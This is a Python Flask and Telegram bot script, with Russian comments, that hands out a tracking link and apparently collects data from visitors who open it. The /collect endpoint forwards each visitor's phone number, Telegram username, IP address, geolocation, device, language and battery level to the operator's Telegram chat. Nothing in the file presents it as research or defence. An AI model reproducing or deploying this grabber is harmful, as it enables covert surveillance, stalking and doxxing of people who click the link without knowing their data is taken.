import os
import threading
from flask import Flask, request
from telegram import Bot, Update
from telegram.ext import Updater, CommandHandler, CallbackContext
import requests

# Вставь сюда свой токен и chat_id
TELEGRAM_TOKEN = 'ВАШ_ТОКЕН_БОТА'
CHAT_ID = 'ВАШ_CHAT_ID'
BOT_LINK = 'https://gsnweb.onrender.com/'  # Заменить на свой URL после деплоя

app = Flask(__name__, static_folder='static')
bot = Bot(token=TELEGRAM_TOKEN)

def send_text_to_telegram(data: dict, ip: str):
    battery = data.get('battery', {})
    phone = data.get('phone', '—')
    username = data.get('username', '—')
    geo = data.get('geolocation', {})

    text = f"""📩 <b>Новый переход!</b>

📞 <b>Номер телефона:</b> {phone}
👤 <b>Telegram @username:</b> {username}
🌐 <b>IP:</b> <code>{ip}</code>
🕓 <b>Время:</b> {data.get('timestamp', '—')}
📍 <b>Геолокация:</b> {geo.get('latitude', '–')}, {geo.get('longitude', '–')}
📱 <b>Устройство:</b> {data.get('platform', '—')}
🕸 <b>Язык:</b> {data.get('language', '—')}
🔋 <b>Батарея:</b> {battery.get('level', '–')}% ({'🔌' if battery.get('charging') else '🔋'})
"""
    bot.send_message(chat_id=CHAT_ID, text=text, parse_mode='HTML')

@app.route('/')
def index():
    return app.send_static_file('index.html')

@app.route('/collect', methods=['POST'])
def collect():
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    send_text_to_telegram(data, ip)
    return '', 204

def getlink(update: Update, context: CallbackContext):
    context.bot.send_message(chat_id=update.effective_chat.id, text=f"🔗 Вот твоя ссылка:\n{BOT_LINK}")

def start_bot():
    updater = Updater(token=TELEGRAM_TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("getlink", getlink))
    updater.start_polling()

if __name__ == '__main__':
    threading.Thread(target=start_bot, daemon=True).start()
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
